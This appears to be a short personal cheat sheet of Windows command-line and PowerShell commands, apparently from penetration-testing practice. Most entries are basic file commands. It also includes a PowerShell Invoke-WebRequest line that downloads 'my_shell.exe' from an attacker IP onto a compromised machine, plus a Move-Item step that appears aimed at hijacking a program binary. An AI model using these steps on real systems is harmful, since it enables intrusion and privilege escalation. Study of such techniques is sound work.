========COMMAND LINE=========

dir - list files in directory or search for files
	dir <target> /s /p
		searches for target file
		
cd - change directory
rename - reanme file
	rename "hello.txt" "goodbye.txt"
	
========POWERSHELL=========
whoami /priv - check privileges
POWERSHELL

Move-Item -Path 'C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe' -Destination 'C:\Program Files (x86)\IObit\Advanced SystemCare'

Download item from web server:
powershell -c "Invoke-WebRequest -Uri 'http://10.6.47.234:8000/my_shell.exe' -OutFile 'C:\Windows\Temp\my_shell.exe'"
	Useful for moving files onto windows system once access is gained


